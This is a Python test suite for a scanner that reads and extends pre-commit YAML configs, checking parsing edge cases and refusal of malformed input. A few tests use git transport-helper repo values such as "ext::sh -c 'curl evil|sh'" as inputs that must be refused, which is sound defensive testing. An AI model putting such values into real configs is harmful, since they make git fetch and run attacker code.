"""The scanner and the additive writer.

These are the two halves of the ruamel replacement, and the reason it is an
improvement rather than a compromise: the scanner refuses what it cannot prove
it understands, and the writer cannot touch a byte outside the blocks it adds.
"""

from __future__ import annotations

import pytest

import config as C

# -- shapes that must be READ correctly --------------------------------------

INDENTED = """\
minimum_pre_commit_version: "4.0.0"
repos:
  - repo: https://github.com/psf/black
    rev: 24.1.0
    hooks:
      - id: black
        args: [--line-length, "100"]
      - id: black-jupyter
"""

SAME_COLUMN = """\
repos:
- repo: https://github.com/psf/black
  rev: 24.1.0
  hooks:
  - id: black
- repo: local
  hooks:
  - id: mine
    name: mine
    entry: ./x.sh
    language: script
"""

OTHER_TOP_KEYS = """\
ci:
  autofix_prs: true
  skip: [mermaid-lint]
default_language_version:
  python: python3.11
exclude: '^vendor/'
repos:
  - repo: https://github.com/pre-commit/pre-commit-hooks
    rev: v6.0.0
    hooks:
      - id: trailing-whitespace
"""


def test_reads_the_indented_style():
    cfg = C.scan(INDENTED)
    assert [e.url for e in cfg.repos] == ["https://github.com/psf/black"]
    entry = cfg.repos[0]
    assert entry.rev == "24.1.0"
    assert [h.id for h in entry.hooks] == ["black", "black-jupyter"]
    assert entry.item_indent == 2
    assert entry.hook_item_indent == 6


def test_reads_a_sequence_at_the_same_column_as_its_key():
    """`repos:` with items at column 0 is valid YAML and very common.

    Pins the defect where the scanner required indent > 0 and refused this
    whole style as "unexpected indentation at the top level".
    """
    cfg = C.scan(SAME_COLUMN)
    assert [e.url for e in cfg.repos] == ["https://github.com/psf/black", "local"]
    assert cfg.repos_seq_indent == 0
    assert cfg.repos[0].hook_item_indent == 2
    assert cfg.local_hook_ids() == {"mine"}


def test_skips_top_level_keys_it_has_no_interest_in():
    """`ci:` and `default_language_version:` are ordinary; refusing them would
    reject a large share of real configs."""
    cfg = C.scan(OTHER_TOP_KEYS)
    assert set(cfg.top_keys) == {"ci", "default_language_version", "exclude", "repos"}
    assert [e.url for e in cfg.repos] == ["https://github.com/pre-commit/pre-commit-hooks"]


def test_a_colon_inside_a_quoted_scalar_is_data():
    cfg = C.scan(
        "repos:\n  - repo: local\n    hooks:\n      - id: x\n        files: '\\.ya?ml:$'\n"
    )
    assert [h.id for h in cfg.repos[0].hooks] == ["x"]


def test_a_trailing_comment_is_not_part_of_a_rev():
    cfg = C.scan(
        "repos:\n  - repo: https://x/y\n    rev: v1.2.3  # pinned deliberately\n"
        "    hooks:\n      - id: a\n"
    )
    assert cfg.repos[0].rev == "v1.2.3"


# -- shapes that must be REFUSED ---------------------------------------------


@pytest.mark.parametrize(
    ("name", "text"),
    [
        ("anchor", "repos:\n  - &base\n    repo: https://x/y\n"),
        ("alias", "repos:\n  - repo: https://x/y\n    hooks: *common\n"),
        ("merge key", "d: &d\n  rev: v1\nrepos:\n  - <<: *d\n    repo: https://x/y\n"),
        ("second document", "repos: []\n---\nrepos: []\n"),
        ("document end", "repos: []\n...\n"),
        ("flow repos", "repos: [{repo: local}]\n"),
        ("flow hooks", "repos:\n  - repo: https://x/y\n    hooks: [{id: a}]\n"),
        ("flow entry", "repos:\n  - {repo: local}\n"),
        ("tab indent", "repos:\n\t- repo: https://x/y\n"),
        ("no repos key", "exclude: 'x'\n"),
        ("duplicate top key", "exclude: 'a'\nexclude: 'b'\nrepos: []\n"),
        ("NUL byte", "repos: []\n\x00\n"),
        ("indented top level", "  repos: []\n"),
        ("top-level line with no colon", "just some prose\n"),
    ],
)
def test_refuses_what_it_cannot_prove_it_understands(name, text):
    with pytest.raises(C.ConfigRefused):
        C.scan(text)


@pytest.mark.parametrize(
    ("name", "text"),
    [
        ("stray line in repos block", "repos:\n  - repo: https://x/y\n  oops\n"),
        ("bare dash", "repos:\n  -\n"),
        ("entry not starting with repo", "repos:\n  - rev: v1\n    repo: https://x/y\n"),
        ("unexpected first key", "repos:\n  - name: mine\n    repo: https://x/y\n"),
        ("repo twice", "repos:\n  - repo: https://x/y\n    repo: https://a/b\n"),
        ("hooks as a scalar", "repos:\n  - repo: https://x/y\n    hooks: nope\n"),
        ("hook in flow style", "repos:\n  - repo: local\n    hooks:\n      - {id: a}\n"),
        ("hook without id", "repos:\n  - repo: local\n    hooks:\n      - name: a\n"),
        ("folded repo url", "repos:\n  - repo: https://github.com/psf/\n      black\n"),
        ("block scalar rev", "repos:\n  - repo: https://x/y\n    rev: |\n      v1\n"),
        ("folded hook id", "repos:\n  - repo: local\n    hooks:\n      - id: my\n          hook\n"),
        # Distinct from "unexpected first key": with no colon at all, _split_key
        # returns None and a different branch raises.
        ("repo entry first line has no colon", "repos:\n  - just text\n"),
        (
            "hook item first line has no colon",
            "repos:\n  - repo: local\n    hooks:\n      - just text\n",
        ),
    ],
)
def test_refuses_inside_an_opened_entry_too(name, text):
    """An untested refusal branch is an untested piece of the spec -- and a
    regression that downgrades one to a guess corrupts the user's config."""
    with pytest.raises(C.ConfigRefused):
        C.scan(text)


def test_a_wrapped_url_is_refused_rather_than_truncated():
    """Truncation is worse than refusal: a shortened url compares against the
    wrong thing, so `already present` misses and a duplicate entry is added."""
    with pytest.raises(C.ConfigRefused, match="continues onto the next line"):
        C.scan("repos:\n  - repo: https://github.com/psf/\n      black\n    rev: v1\n")


def test_a_leading_document_marker_is_fine():
    """One `---` opens the only document; only a second one is ambiguous."""
    cfg = C.scan("---\nrepos:\n  - repo: local\n    hooks:\n      - id: a\n")
    assert [e.url for e in cfg.repos] == ["local"]


@pytest.mark.parametrize(
    "line",
    [
        "    entry: bash -c 'a && b'",
        "    args: [--fix, --glob, '*.md']",
        "    exclude: '^(a|b)*$'",
        "    entry: node scripts/lint-mermaid.mjs",
        "    files: '\\.(md|markdown)$'",
    ],
)
def test_the_anchor_guard_does_not_fire_on_ordinary_lines(line):
    """`&&` in a shell entry and `*` in a glob are not YAML anchors.

    A false positive here refuses a perfectly ordinary config, which is a worse
    failure than the one the guard exists to prevent.
    """
    assert C._ANCHOR.search(line) is None


# -- the additive guarantee --------------------------------------------------


def test_verify_additive_accepts_a_real_multi_block_insert():
    """Pins the offset defect: verify_additive added a running offset while
    reconstructing, which mis-sliced every insertion after the first and
    reported a clean additive merge as a clobber."""
    original = [f"line{i}" for i in range(12)]
    insertions = [
        C.Insertion(at=3, block=["added-a"], what="a"),
        C.Insertion(at=12, block=["added-b1", "added-b2"], what="b"),
    ]
    result = C.apply_insertions(original, insertions)
    assert len(result) == len(original) + 3
    C.verify_additive(original, result, insertions)  # must not raise


def test_verify_additive_catches_a_changed_line():
    original = ["a", "b", "c"]
    insertions = [C.Insertion(at=1, block=["new"], what="x")]
    result = C.apply_insertions(original, insertions)
    result[2] = "b-TAMPERED"
    with pytest.raises(C.ConfigRefused, match="outside the blocks"):
        C.verify_additive(original, result, insertions)


def test_verify_additive_rejects_two_blocks_at_one_position():
    """The splice cannot preserve their order, so it must not be attempted."""
    original = ["a", "b"]
    insertions = [
        C.Insertion(at=1, block=["x"], what="x"),
        C.Insertion(at=1, block=["y"], what="y"),
    ]
    with pytest.raises(C.ConfigRefused, match="same line"):
        C.verify_additive(original, C.apply_insertions(original, insertions), insertions)


def test_apply_insertions_keeps_untouched_lines_byte_identical():
    original = ["# comment", "exclude: '^x/'", "", "repos:", "- repo: local"]
    insertions = [C.Insertion(at=3, block=['minimum_pre_commit_version: "4.0.0"'], what="m")]
    result = C.apply_insertions(original, insertions)
    assert result[:3] == original[:3]
    assert result[4:] == original[3:]


# -- indentation -------------------------------------------------------------


def test_hook_delta_reads_the_files_convention():
    indented = C.scan(INDENTED)
    same = C.scan(SAME_COLUMN)
    assert C.observed_hook_delta(indented) == 2  # hooks indented under their key
    assert C.observed_hook_delta(same) == 0  # hooks at the key's own column


def test_render_entry_adopts_the_targets_convention():
    """Writing indented hooks into a file that does not indent them produces a
    config the skill's own yamllint hook rejects under
    `indent-sequences: consistent`."""
    fragment = "- repo: https://x/y\n  rev: v1\n  hooks:\n    - id: a\n      args: [--x]\n"
    entry = C.scan("repos:\n" + fragment).repos[0]

    flat = C.render_entry(fragment, entry, seq_indent=0, want_hook_delta=0)
    assert flat == ["- repo: https://x/y", "  rev: v1", "  hooks:", "  - id: a", "    args: [--x]"]

    nested = C.render_entry(fragment, entry, seq_indent=2, want_hook_delta=2)
    assert nested[0] == "  - repo: https://x/y"
    assert nested[3] == "      - id: a"


def test_reindent_leaves_blank_lines_empty():
    assert C.reindent("a\n\nb", 2) == "  a\n\n  b"


def test_an_inline_comment_with_emphasis_is_not_an_anchor():
    """`# skip *generated* files` is prose, not a YAML alias.

    The anchor guard runs over the whole file before any structural parsing, so
    a false positive here refuses an ordinary config the tool exists to extend.
    """
    cfg = C.scan(
        "exclude: 'vendor/'  # skip *generated* files\n"
        "repos:\n  - repo: https://x/y\n    rev: v1\n    hooks:\n      - id: a\n"
    )
    assert [e.url for e in cfg.repos] == ["https://x/y"]


def test_a_real_alias_after_a_comment_is_still_refused():
    """Stripping comments must not also blind the guard to real aliases."""
    with pytest.raises(C.ConfigRefused, match="anchor or alias"):
        C.scan("repos:\n  - repo: https://x/y  # note\n    hooks: *common\n")


def test_scan_reports_an_empty_flow_list():
    cfg = C.scan('minimum_pre_commit_version: "4.0.0"\nrepos: []\n')
    assert cfg.empty_repos is True
    assert cfg.repos == []


def test_repos_with_a_trailing_comment_is_a_block_sequence():
    """`repos: # note` has an empty value. Without stripping the comment the
    value read as "# note", which the block-sequence check refused -- rejecting
    an ordinary file this tool exists to extend."""
    cfg = C.scan("repos:  # the hooks we run\n  - repo: local\n    hooks:\n      - id: a\n")
    assert [e.url for e in cfg.repos] == ["local"]
    assert cfg.empty_repos is False


def test_hooks_with_a_trailing_comment_is_a_block_sequence():
    cfg = C.scan(
        "repos:\n  - repo: local\n    hooks:  # two of them\n      - id: a\n      - id: b\n"
    )
    assert [h.id for h in cfg.repos[0].hooks] == ["a", "b"]


def test_a_quoted_hash_is_still_part_of_the_value():
    """Stripping comments must not eat a # that is inside quotes."""
    cfg = C.scan("repos:\n  - repo: local\n    hooks:\n      - id: a\n        files: '#tagged'\n")
    assert [h.id for h in cfg.repos[0].hooks] == ["a"]


def test_a_crlf_config_records_its_terminator():
    cfg = C.scan("repos:\r\n  - repo: local\r\n    hooks:\r\n      - id: a\r\n")
    assert cfg.newline == "\r\n"
    assert cfg.ends_with_newline is True
    assert [e.url for e in cfg.repos] == ["local"]


def test_a_config_with_no_trailing_newline_records_that():
    cfg = C.scan("repos:\n  - repo: local\n    hooks:\n      - id: a")
    assert cfg.ends_with_newline is False


@pytest.mark.parametrize(
    "codepoint",
    [0x0B, 0x0C, 0x1C, 0x1D, 0x1E, 0x85, 0x2028, 0x2029],
    ids=["VT", "FF", "FS", "GS", "RS", "NEL", "LS", "PS"],
)
def test_refuses_a_line_break_that_is_not_a_newline(codepoint):
    """str.splitlines() breaks on all of these and DISCARDS the character, so
    rejoining materialises a plain newline where it used to be -- a silent
    content change that verify_additive cannot see, because its baseline is
    already the corrupted line list."""
    text = "repos:\n  - repo: local" + chr(codepoint) + "\n    hooks:\n      - id: a\n"
    with pytest.raises(C.ConfigRefused, match="line-breaking character"):
        C.scan(text)


def test_an_ordinary_config_still_scans():
    """The guard above must not fire on \n or \r\n."""
    assert C.scan("repos:\n  - repo: local\n    hooks:\n      - id: a\n").repos
    assert C.scan("repos:\r\n  - repo: local\r\n    hooks:\r\n      - id: a\r\n").repos


def test_a_folded_continuation_that_looks_like_nesting_is_still_refused():
    """repo:/rev:/id: always carry an inline scalar, so nothing can nest under
    them -- a deeper following line is a continuation whatever it looks like.
    Exempting one that parsed as `key: value` let the truncation this guard
    exists to prevent straight through."""
    with pytest.raises(C.ConfigRefused, match="continues onto the next line"):
        C.scan("repos:\n  - repo: https://x/foo\n      note: something\n")


def test_a_folded_continuation_shaped_like_a_sequence_item_is_refused():
    with pytest.raises(C.ConfigRefused, match="continues onto the next line"):
        C.scan("repos:\n  - repo: local\n    hooks:\n      - id: a\n          - b\n")


def test_an_empty_block_form_repos_key_scans():
    """Distinct from `repos: []`: a block-form key with no items at all. Never
    constructed by a fixture, but it feeds plan()'s fallback indents."""
    cfg = C.scan("repos:\n")
    assert cfg.repos == []
    assert cfg.repos_seq_indent is None
    assert cfg.repos_end is None
    assert cfg.empty_repos is False


def test_a_repos_key_followed_by_another_top_key_scans():
    cfg = C.scan("repos:\nexclude: 'x'\n")
    assert cfg.repos == []
    assert set(cfg.top_keys) == {"repos", "exclude"}


# -- guards added after round 11 of the reviewer panel ------------------------


def test_a_gating_key_written_as_a_block_list_is_captured():
    """The everyday form. Reading only the inline scalar left settings["stages"]
    as "", which every caller then treats as "not set" -- so a hook confined to
    the manual stage was reported as active coverage."""
    cfg = C.scan(
        "repos:\n  - repo: local\n    hooks:\n      - id: a\n"
        "        stages:\n          - manual\n          - push\n"
    )
    assert cfg.repos[0].hooks[0].settings["stages"] == "[manual, push]"


def test_the_flow_form_of_a_gating_key_still_works():
    cfg = C.scan("repos:\n  - repo: local\n    hooks:\n      - id: a\n        stages: [manual]\n")
    assert cfg.repos[0].hooks[0].settings["stages"] == "[manual]"


def test_a_hash_without_preceding_whitespace_is_part_of_the_value():
    """YAML opens a comment only at an unquoted # preceded by whitespace.
    Cutting at any # truncated ordinary values silently -- the outcome this
    module says is worse than a refusal."""
    cfg = C.scan(
        "repos:\n  - repo: local\n    hooks:\n      - id: check-todo#123\n"
        "        exclude: vendor/.*#generated$\n"
    )
    hook = cfg.repos[0].hooks[0]
    assert hook.id == "check-todo#123"
    assert hook.settings["exclude"] == "vendor/.*#generated$"


def test_a_real_trailing_comment_is_still_dropped():
    cfg = C.scan("repos:\n  - repo: local  # the local block\n    hooks:\n      - id: a\n")
    assert cfg.repos[0].url == "local"


# -- guards added after round 12 of the reviewer panel ------------------------


def test_a_doubled_quote_inside_a_single_quoted_scalar_is_not_a_close():
    """`'foo''bar'` is YAML for foo'bar. Treating every quote as a close read
    it as `foo` -- a silent truncation, in a module whose stated rule is that a
    refusal beats a wrong answer that looks right."""
    cfg = C.scan(
        "repos:\n  - repo: local\n    hooks:\n      - id: a\n        exclude: 'foo''bar'\n"
    )
    assert cfg.repos[0].hooks[0].settings["exclude"] == "foo'bar"


def test_a_backslash_escaped_quote_inside_a_double_quoted_scalar_is_not_a_close():
    cfg = C.scan(
        'repos:\n  - repo: local\n    hooks:\n      - id: a\n        exclude: "foo\\"bar"\n'
    )
    assert "bar" in cfg.repos[0].hooks[0].settings["exclude"]


def test_a_hash_inside_a_quoted_scalar_is_not_a_comment():
    cfg = C.scan(
        "repos:\n  - repo: local\n    hooks:\n      - id: a\n        exclude: 'vendor/ #keep'\n"
    )
    assert cfg.repos[0].hooks[0].settings["exclude"] == "vendor/ #keep"


def test_an_unterminated_quote_is_refused_not_guessed_at():
    with pytest.raises(C.ConfigRefused, match="never closed"):
        C.scan("repos:\n  - repo: 'local\n    hooks:\n      - id: a\n")


# -- guards added after round 13 of the reviewer panel ------------------------


@pytest.mark.parametrize(
    "url",
    ["ext::sh -c 'curl evil|sh'", "fd::7", "helper::whatever"],
    ids=["ext", "fd", "arbitrary-helper"],
)
def test_a_transport_helper_repo_is_refused(url):
    """This tool hardens its own git calls, but Step 4 runs the separate
    pre-commit binary, which clones every repo: entry with its own ambient git
    config. Such a URL names a program git runs when it does."""
    with pytest.raises(C.ConfigRefused, match="transport helper"):
        C.scan(f"repos:\n  - repo: {url}\n    hooks:\n      - id: a\n")


@pytest.mark.parametrize(
    "url",
    [
        "https://github.com/psf/black",
        "git@github.com:psf/black.git",
        "ssh://git@example.invalid/x.git",
        "local",
        "meta",
        "/srv/mirrors/hooks.git",
        "../sibling-repo",
    ],
)
def test_an_ordinary_repo_value_is_accepted(url):
    """An ordinary filesystem path is fine -- people do use them. Only the
    run-a-program shape is refused."""
    cfg = C.scan(f"repos:\n  - repo: {url}\n    hooks:\n      - id: a\n")
    assert cfg.repos[0].url == url


# -- round 15 ----------------------------------------------------------------


def _hook_settings(text: str) -> dict:
    return C.scan(text).repos[0].hooks[0].settings


def test_a_block_sequence_at_its_key_s_own_column_is_read():
    """YAML permits it, and this scanner already supports the style for repos:
    and hooks:. Reading it as "" made looks_disabled() treat a manual-only hook
    as active coverage -- the exact false-coverage failure the feature exists to
    prevent, reintroduced by an indentation style."""
    same_column = (
        "repos:\n"
        "  - repo: https://github.com/gitleaks/gitleaks\n"
        "    rev: v8.0.0\n"
        "    hooks:\n"
        "      - id: gitleaks\n"
        "        stages:\n"
        "        - manual\n"
    )
    assert _hook_settings(same_column)["stages"] == "[manual]"


def test_the_indented_block_sequence_style_still_reads():
    indented = (
        "repos:\n"
        "  - repo: https://github.com/gitleaks/gitleaks\n"
        "    rev: v8.0.0\n"
        "    hooks:\n"
        "      - id: gitleaks\n"
        "        stages:\n"
        "          - manual\n"
        "          - push\n"
    )
    assert _hook_settings(indented)["stages"] == "[manual, push]"


def test_a_sibling_key_at_the_same_column_ends_the_sequence():
    text = (
        "repos:\n"
        "  - repo: https://github.com/gitleaks/gitleaks\n"
        "    rev: v8.0.0\n"
        "    hooks:\n"
        "      - id: gitleaks\n"
        "        stages:\n"
        "        - manual\n"
        "        files: '\\.py$'\n"
    )
    settings = _hook_settings(text)
    assert settings["stages"] == "[manual]"
    assert settings["files"] == "\\.py$"  # _scalar strips the quotes


def test_ragged_sequence_items_are_not_read_as_one_sequence():
    """Refusing to guess is this scanner's posture everywhere else."""
    text = (
        "repos:\n"
        "  - repo: https://github.com/gitleaks/gitleaks\n"
        "    rev: v8.0.0\n"
        "    hooks:\n"
        "      - id: gitleaks\n"
        "        stages:\n"
        "        - manual\n"
        "          - push\n"
    )
    assert _hook_settings(text)["stages"] == "[manual]"


def test_double_quoted_scalars_resolve_their_escapes_and_single_quoted_do_not():
    """`files: "\\\\.md$"` is the regex `\\.md$` to YAML and to pre-commit.
    Reading the two backslashes as written compiled a regex for a literal
    backslash and called a live hook dead. Single quotes have no escapes, so
    `'\\\\.md$'` really is two backslashes -- to YAML, to pre-commit, and here."""
    cfg = C.scan(
        "repos:\n  - repo: local\n    hooks:\n"
        '      - id: a\n        entry: x\n        language: system\n        files: "\\\\.md$"\n'
        "      - id: b\n        entry: x\n        language: system\n        files: '\\\\.md$'\n"
        '      - id: c\n        entry: x\n        language: system\n        files: "a\\tb\\u00e9\\"q\\""\n'
    )
    a, b, c = cfg.repos[0].hooks
    assert a.settings["files"] == "\\.md$"
    assert b.settings["files"] == "\\\\.md$"
    assert c.settings["files"] == 'a\tb\u00e9"q"'


def test_top_level_sequence_reads_flow_and_block_forms_alike():
    """`default_stages:` decides whether a hook without its own `stages:` runs
    on commit, and the block form is the everyday way to write it."""
    flow = C.scan("default_stages: [manual, pre-push]\nrepos: []\n")
    assert C.top_level_sequence(flow, "default_stages") == "[manual, pre-push]"
    block = C.scan("default_stages:\n  - manual\n  - pre-push\nrepos: []\n")
    assert C.top_level_sequence(block, "default_stages") == "[manual, pre-push]"
    assert C.top_level_sequence(flow, "fail_fast") is None
    # A same-column block sequence at the top level is refused by scan() itself
    # ("top-level line is not a `key: value` mapping entry"), so there is no
    # config in which this reader would meet one.


def test_a_hook_level_value_continued_onto_the_next_line_is_read_the_same_way():
    """`files:` over an indented `^docs/` inside a hook was stored as "" -- and
    "" compiles to a pattern that matches every path. The hook's gating keys
    now read the way a top-level key does; a block sequence is still a block
    sequence, and a sibling key ends the value."""
    cfg = C.scan(
        "repos:\n  - repo: local\n    hooks:\n"
        "      - id: a\n        entry: x\n        language: system\n"
        "        files:\n          ^docs/\n"
        "        exclude: |-\n          ^never/\n"
        "        stages:\n          - manual\n"
        "      - id: b\n        entry: x\n        language: system\n"
        "        files: ^src/\n          a\\.py$\n"
    )
    a, b = cfg.repos[0].hooks
    assert a.settings["files"] == "^docs/"
    assert a.settings["exclude"] == "|-"
    assert a.settings["stages"] == "[manual]"
    assert b.settings["files"] == "^src/ a\\.py$"


def test_a_top_level_value_continued_onto_the_next_line_is_read_and_folded():
    """`files:\n  ^src/` and `default_stages:\n  [manual]` are ordinary YAML.
    Read from the key's own line only, both came back empty -- a config-wide
    filter silently dropped from every hook's scope, a stage default read as
    unset -- and YAML's own rule for the continued lines of a plain or flow
    scalar is to fold them with single spaces."""
    cfg = C.scan(
        "files:\n  ^src/\nexclude:\n  # a comment between\n  ^vendor/\n"
        "default_stages:\n  [manual,\n   pre-push]\nrepos: []\n"
    )
    assert C.top_level_scalar(cfg, "files") == "^src/"
    assert C.top_level_scalar(cfg, "exclude") == "^vendor/"
    assert C.top_level_sequence(cfg, "default_stages") == "[manual, pre-push]"
    commented = C.scan("default_stages:\n  [manual, # why\n   pre-push]  # and why\nrepos: []\n")
    assert C.top_level_sequence(commented, "default_stages") == "[manual, pre-push]"
    tabbed = C.scan("default_stages:\n  [manual,\t# why\n   pre-push]\nrepos: []\n")
    assert C.top_level_sequence(tabbed, "default_stages") == "[manual, pre-push]"
    # A blank line inside a continued plain scalar folds to a newline, as YAML
    # has it -- so the regex pre-commit compiles is the one read here.
    broken = C.scan("files:\n  ^docs/\n\n  a\\.md$\nrepos: []\n")
    assert C.top_level_scalar(broken, "files") == "^docs/\na\\.md$"
    # A block-scalar indicator continued onto the next line is handed back as
    # the indicator, the same "pattern not read" as `files: |` on the key's line.
    indicator = C.scan("files:\n  |\n    ^docs/\nrepos: []\n")
    assert C.top_level_scalar(indicator, "files") == "|"
    # A backslash ending a line inside a double-quoted value escapes the break:
    # the two lines join with nothing between, and the backslash goes.
    escaped = C.scan('files:\n  "^docs/\\\n   .*\\\\.md$"\nrepos: []\n')
    assert C.top_level_scalar(escaped, "files") == "^docs/.*\\.md$"
    # In single quotes a backslash is a character like any other, and the break
    # folds to a space.
    literal = C.scan("files:\n  '^docs/\\\n   .*\\\\.md$'\nrepos: []\n")
    assert C.top_level_scalar(literal, "files") == "^docs/\\ .*\\\\.md$"
    # An indicator on the key's line stays the indicator, whatever follows it.
    on_key = C.scan("files: |-\n  ^docs/\nrepos: []\n")
    assert C.top_level_scalar(on_key, "files") == "|-"
    # YAML's white space is space and tab; a U+00A0 at the end of a plain
    # scalar is content, inline or continued, and stays in the pattern.
    nbsp = C.scan("files: ^a\u00a0\nexclude:\n  ^b\u00a0\nrepos: []\n")
    assert C.top_level_scalar(nbsp, "files") == "^a\u00a0"
    assert C.top_level_scalar(nbsp, "exclude") == "^b\u00a0"
    # A plain scalar may start on the key's line and continue below it.
    prefixed = C.scan(
        "files: ^docs/\n  a\\.md$\ndefault_stages: [manual,\n  pre-push]\nrepos: []\n"
    )
    assert C.top_level_scalar(prefixed, "files") == "^docs/ a\\.md$"
    assert C.top_level_sequence(prefixed, "default_stages") == "[manual, pre-push]"
    block = C.scan("default_stages:\n  - manual\nrepos: []\n")
    assert C.top_level_sequence(block, "default_stages") == "[manual]"
    assert C.top_level_scalar(cfg, "fail_fast") is None


def test_top_level_scalar_is_public():
    """precommit.py was reaching through _split_key + _scalar, twice."""
    cfg = C.scan("exclude: '^vendor/'\nrepos:\n  - repo: https://x/y\n    hooks:\n      - id: a\n")
    assert C.top_level_scalar(cfg, "exclude") == "^vendor/"  # unquoted, like every scalar
    assert C.top_level_scalar(cfg, "fail_fast") is None


def test_a_local_path_repo_is_disclosed_rather_than_refused():
    """A bare path and a file:// URL are legitimate -- monorepos do this -- so
    neither is refused. But neither is a named remote either: what pre-commit
    clones comes off this disk, and it used to be carried across in total
    silence while the ext:: shape next door is announced."""
    cfg = C.scan(
        "repos:\n"
        "  - repo: file:///tmp/hooks\n    rev: v1\n    hooks:\n      - id: a\n"
        "  - repo: ../sibling-hooks\n    rev: v1\n    hooks:\n      - id: b\n"
        "  - repo: https://github.com/psf/black\n    rev: v1\n    hooks:\n      - id: c\n"
        "  - repo: local\n    hooks:\n      - id: d\n        name: d\n"
        "        entry: ./x.sh\n        language: script\n"
    )
    assert C.local_repo_sources(cfg) == ["../sibling-hooks", "file:///tmp/hooks"]


def test_a_transport_helper_is_still_refused_outright():
    """Disclosure is for what cannot be adjudicated; `ext::` names a program."""
    with pytest.raises(C.ConfigRefused, match="transport helper"):
        C.scan("repos:\n  - repo: ext::sh -c 'id'\n    hooks:\n      - id: a\n")


# -- the scanner's edges -------------------------------------------------------
#
# Line-by-line parsing lives or dies on these. Each one is a shape a real config
# can have, and a scanner that mis-reads one either refuses a file it should
# accept or -- worse -- accepts a file it has misunderstood.


def test_a_colon_inside_a_quoted_key_does_not_split_the_line():
    """A quoted key is legal YAML and may contain a colon. Splitting on that
    colon would invent a key out of half a quoted string -- and the halves are
    then compared against the gating names."""
    cfg = C.scan("repos:\n  - repo: local\n    hooks:\n      - id: a\n        'weird: key': v\n")
    assert [h.id for h in cfg.repos[0].hooks] == ["a"]
    # Kept whole, so no gating key is invented out of the halves.
    assert "weird" not in cfg.repos[0].hooks[0].settings


def test_a_quote_that_is_never_closed_is_refused():
    with pytest.raises(C.ConfigRefused, match="never closed"):
        C.scan("repos:\n  - repo: local\n    hooks:\n      - id: a\n        'oops: x\n")


def test_a_line_whose_only_colon_has_no_space_after_it_is_not_a_key():
    """`a:b` is a plain scalar. Reading it as a mapping entry would invent a
    key nobody wrote."""
    cfg = C.scan("repos:\n  - repo: local\n    hooks:\n      - id: a\n    notakey:value\n")
    assert [h.id for h in cfg.repos[0].hooks] == ["a"]


def test_a_line_that_is_all_comment_after_some_text_yields_no_key():
    cfg = C.scan("repos:\n  - repo: local\n    hooks:\n      - id: a\n    plain # note\n")
    assert [h.id for h in cfg.repos[0].hooks] == ["a"]


def test_a_trailing_comment_on_a_sequence_item_is_not_part_of_it():
    """_scalar sees the raw item here: _split_key never runs on a `- x` line."""
    cfg = C.scan(
        "repos:\n  - repo: local\n    hooks:\n      - id: a\n        stages:\n"
        "          - manual # only by hand\n"
    )
    assert cfg.repos[0].hooks[0].settings["stages"] == "[manual]"


def test_a_merge_key_is_refused_even_with_no_anchor_in_sight():
    """The anchor check fires first on the usual `<<: *base`, so the merge-key
    branch needs a merge key with no alias to be reached at all."""
    with pytest.raises(C.ConfigRefused, match="merge key"):
        C.scan("repos:\n  - repo: local\n    hooks:\n      - id: a\n        <<: plain\n")


def test_a_top_level_key_after_repos_ends_the_block():
    cfg = C.scan(
        "repos:\n  - repo: local\n    hooks:\n      - id: a\n"
        "default_language_version:\n  python: python3.11\n"
    )
    assert [e.url for e in cfg.repos] == ["local"]
    assert "default_language_version" in cfg.top_keys


def test_blank_lines_and_comments_inside_an_entry_are_carried_not_read():
    cfg = C.scan(
        "repos:\n  - repo: https://x/y\n\n    # why this one\n    rev: v1\n"
        "    hooks:\n\n      # and this hook\n      - id: a\n"
    )
    assert cfg.repos[0].rev == "v1"
    assert [h.id for h in cfg.repos[0].hooks] == ["a"]


def test_a_deeper_line_inside_an_entry_is_carried_not_read():
    """Anything more indented than the entry's keys belongs to a value this
    scanner does not interpret -- it is preserved, not parsed."""
    cfg = C.scan(
        "repos:\n  - repo: local\n    hooks:\n      - id: a\n        name: a\n"
        "        additional_dependencies:\n          - some-package==1.0\n"
    )
    assert [h.id for h in cfg.repos[0].hooks] == ["a"]


def test_a_blank_line_inside_a_block_sequence_does_not_end_it():
    cfg = C.scan(
        "repos:\n  - repo: local\n    hooks:\n      - id: a\n        stages:\n"
        "          - manual\n\n          - push\n"
    )
    assert cfg.repos[0].hooks[0].settings["stages"] == "[manual, push]"


def test_a_dedent_ends_a_block_sequence():
    cfg = C.scan(
        "repos:\n  - repo: local\n    hooks:\n      - id: a\n        stages:\n"
        "          - manual\n      - id: b\n"
    )
    assert cfg.repos[0].hooks[0].settings["stages"] == "[manual]"
    assert [h.id for h in cfg.repos[0].hooks] == ["a", "b"]
